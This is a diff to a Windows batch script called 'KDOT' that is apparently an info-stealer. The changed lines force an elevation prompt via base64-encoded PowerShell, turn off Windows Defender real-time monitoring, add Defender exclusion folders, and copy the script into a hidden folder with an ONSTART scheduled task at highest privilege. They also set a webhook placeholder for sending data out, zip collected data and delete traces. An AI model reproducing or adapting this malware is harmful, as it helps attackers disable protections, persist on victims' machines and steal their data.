@@ -1,6 +1,11 @@
 @echo off
+goto check_uac
+
+:check_uac
 NET SESSION >nul 2>&1
-if %errorlevel% == 0 goto naw
+if %errorlevel% == 0 goto begin
+
+:no_uac
 cd %userprofile%\AppData\Local\Temp
 powershell $command = 'Start-Process %~f0'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt
 set /p base64code=<%userprofile%\AppData\Local\Temp\test.txt
@@ -11,16 +16,19 @@ powershell.exe -executionpolicy remotesigned -File %userprofile%\AppData\Local\T
 del %userprofile%\AppData\Local\Temp\penis.ps1
 exit
 
-:naw
+:begin
 @echo off
 PowerShell Set-MpPreference -DisableRealtimeMonitoring 1
-mkdir %localappdata%\KDOT
-COPY %~f0 %localappdata%\KDOT\KDOT.bat
+if not exist %localappdata%\KDOT (
+    mkdir %localappdata%\KDOT
+    COPY %~f0 %localappdata%\KDOT\KDOT.bat
+)
 SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
-if %errorlevel% equ 0 goto code
+if %errorlevel% equ 0 goto info
 SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat" /RL HIGHEST /F /DELAY 0000:10
+goto info
 
-:code
+:info
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%localappdata%\KDOT"
 set webhook=YOUR_WEBHOOK_HERE
@@ -97,4 +105,4 @@ powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath 
 del %localappdata%\Temp\main.exe
 rmdir /s /q %localappdata%\Temp\KDOT
 del KDOT.zip
-exit
+timeout 3 > NUL
